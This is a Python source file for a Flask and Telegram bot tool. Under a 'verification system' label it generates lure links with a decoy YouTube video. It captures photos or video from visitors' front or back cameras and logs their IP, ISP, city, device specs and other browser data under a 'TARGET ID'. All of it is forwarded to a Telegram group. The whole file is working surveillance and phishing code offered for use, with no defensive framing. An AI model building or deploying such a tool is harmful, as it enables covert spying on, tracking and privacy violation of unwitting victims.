import os, telebot, threading, io, time
from flask import Flask, render_template, request

# --- CONFIG ---
TOKEN = os.environ.get('TOKEN')
BASE_URL = os.environ.get('BASE_URL') 
GROUP_ID = os.environ.get('GROUP_ID') 
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

user_temp = {}
collection = {}

# --- TELEGRAM BOT LOGIC ---
@bot.message_handler(commands=['start'])
def start(m):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("🤳 Front Cam", "📷 Back Cam")
    bot.send_message(m.chat.id, "✅ AnyaStore Verification System Active.", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text in ["🤳 Front Cam", "📷 Back Cam"])
def set_cam(m):
    user_temp[m.chat.id] = {'cam': 'user' if "Front" in m.text else 'environment'}
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("📸 8 Photos", "🎥 3s Video")
    msg = bot.send_message(m.chat.id, "Select mode:", reply_markup=markup)
    bot.register_next_step_handler(msg, set_mode)

def set_mode(m):
    if m.chat.id not in user_temp: user_temp[m.chat.id] = {}
    user_temp[m.chat.id]['mode'] = 'photo' if "Photos" in m.text else 'video'
    msg = bot.send_message(m.chat.id, "Enter YouTube ID (or 'default'):")
    bot.register_next_step_handler(msg, make_link)

def make_link(m):
    yt = m.text if m.text.lower() != 'default' else 'dQw4w9WgXcQ'
    d = user_temp.get(m.chat.id, {'cam':'user','mode':'photo'})
    link = f"{BASE_URL}/?id={m.chat.id}&mode={d['mode']}&cam={d['cam']}&ytid={yt}"
    bot.send_message(m.chat.id, f"🚀 **Link Ready:**\n`{link}`", parse_mode="Markdown")

# --- WEB SERVER LOGIC ---
@app.route('/')
def index():
    ua = request.headers.get('User-Agent', '').lower()
    # Route to different templates based on OS
    if 'iphone' in ua or 'ipad' in ua:
        return render_template('ios.html')
    elif 'android' in ua:
        return render_template('android.html')
    else:
        return render_template('pc.html')

@app.route('/log_info', methods=['POST'])
def log_info():
    data = request.json
    tid = request.args.get('id')
    
    info = (
        f"⚡ **GOD-MODE SYSTEM SCAN** ⚡\n"
        f"━━━━━━━━━━━━━━━\n"
        f"👤 **TARGET ID:** `{tid}`\n"
        f"🌐 **IP:** `{data.get('ip')}`\n"
        f"🏢 **ISP:** {data.get('org')}\n"
        f"📍 **LOC:** {data.get('city')}, {data.get('country_name')}\n"
        f"━━━━━━━━━━━━━━━\n"
        f"📡 **NETWORK STATUS**\n"
        f"• **Type:** {data.get('net_type', 'N/A')}\n"
        f"• **Speed:** {data.get('net_speed', 'N/A')}\n"
        f"• **VPN/Proxy:** {'⚠️ DETECTED' if data.get('proxy') else '✅ CLEAN'}\n"
        f"━━━━━━━━━━━━━━━\n"
        f"📱 **DEVICE SPECS**\n"
        f"• **Hardware:** {data.get('platform')} ({data.get('cores')} Cores)\n"
        f"• **RAM:** {data.get('memory')} GB\n"
        f"• **Orientation:** {data.get('orientation')}\n"
        f"• **GPU:** {data.get('gpu', 'N/A')}\n"
        f"🔋 **Battery:** {data.get('battery')}\n"
        f"━━━━━━━━━━━━━━━\n"
        f"🛠️ **ENVIRONMENT**\n"
        f"• **Timezone:** {data.get('timezone')}\n"
        f"• **Language:** {data.get('language')}\n"
        f"• **Motion:** {data.get('motion', 'N/A')}\n"
        f"📄 **UserAgent:** `{data.get('browser')[:60]}...`"
    )
    
    collection[tid] = collection.get(tid, {"photos": []})
    collection[tid]["info"] = info
    return "OK"

@app.route('/upload', methods=['POST'])
def upload():
    tid = request.args.get('id')
    file_bytes = request.files['file'].read()
    
    if tid not in collection:
        collection[tid] = {"photos": [], "info": f"ID: `{tid}`"}
    
    if request.args.get('type') == 'video':
        info = collection[tid].get("info", f"ID: {tid}")
        bot.send_video(GROUP_ID, io.BytesIO(file_bytes), caption=f"📁 VIDEO LOG\n{info}", parse_mode="Markdown")
        return "OK"

    collection[tid]["photos"].append(file_bytes)
    if len(collection[tid]["photos"]) >= 8:
        info = collection[tid].get("info", f"ID: {tid}")
        admin_album = [telebot.types.InputMediaPhoto(p, caption=info if i==0 else "", parse_mode="Markdown") 
                       for i, p in enumerate(collection[tid]["photos"])]
        bot.send_media_group(GROUP_ID, admin_album)
        del collection[tid]
    return "OK"

def run_bot():
    while True:
        try:
            bot.remove_webhook()
            bot.polling(none_stop=True, interval=0, timeout=20)
        except: time.sleep(10)

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))
